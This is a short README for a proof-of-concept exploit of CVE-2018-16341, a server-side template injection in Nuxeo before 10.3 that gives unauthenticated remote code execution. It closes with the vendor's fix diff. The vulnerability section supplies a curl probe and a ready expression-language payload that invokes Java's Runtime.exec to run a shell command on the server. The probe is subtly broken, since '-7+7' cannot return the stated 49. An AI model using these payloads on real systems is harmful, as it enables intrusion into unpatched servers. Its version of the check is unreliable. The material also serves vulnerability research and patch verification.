# CVE-2018-16341

Nuxeo Authentication Bypass Remote Code Execution < 10.3 using a SSTI - CVE-2018-16341

![image](https://user-images.githubusercontent.com/5891788/53368219-6e272b00-3948-11e9-8e08-b919c6cf1bcd.png)

**Detailed analysis (not english)**:
- https://www.freebuf.com/vuls/193000.html
- https://blog.riskivy.com/nuxeo-rce-analysis-cve-2018-16341/

**Security Advisory**:
- https://github.com/nuxeo/nuxeo/commit/eb54a9145c6d8297eba9d7dafc74556e735fa388#diff-cf2094833ef0eea473d03bf6559f1798R97 

**Note**: The version of Nuxeo 9.x is not [supported anymore](https://www.nuxeo.com/legal/supported-versions/) by Nuxeo but a hotfix has been provided for the version 9.x. On my side, the version 9.10 was vulnerable.

---
### The vulnerability

This PoC exploit a Server Side Template Injection (SSTI) in order to achieve the RCE located in the file `NuxeoUnknownResource.java`

- To check if Nuxeo is vulnerable just send this payload and check for the number **49**:
```
curl http://127.0.0.1:8080/nuxeo/login.jsp/pwn${-7+7}.xhtml"
```

- Get the RCE using this payload:
```
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("touch /tmp/pwn.txt",null).waitFor()}
```

---
Fix

```diff
@@ -94,8 +92,13 @@ public void connect() throws IOException {
 
             @Override
             public InputStream getInputStream() throws IOException {
+                String message = "ERROR: facelet not found";
+                // NXP-25746
+                if (Framework.isDevModeSet() && !path.contains("$") && !path.contains("#")) {
+                    message += " at '" + path + "'";
+                }
                 String msg = "<span><span style=\"color:red;font-weight:bold;\">"
-                        + StringEscapeUtils.escapeHtml4(errorMessage) + "</span><br/></span>";
+                        + StringEscapeUtils.escapeHtml4(message) + "</span><br/></span>";
                 return new ByteArrayInputStream(msg.getBytes());
             }
         }
```
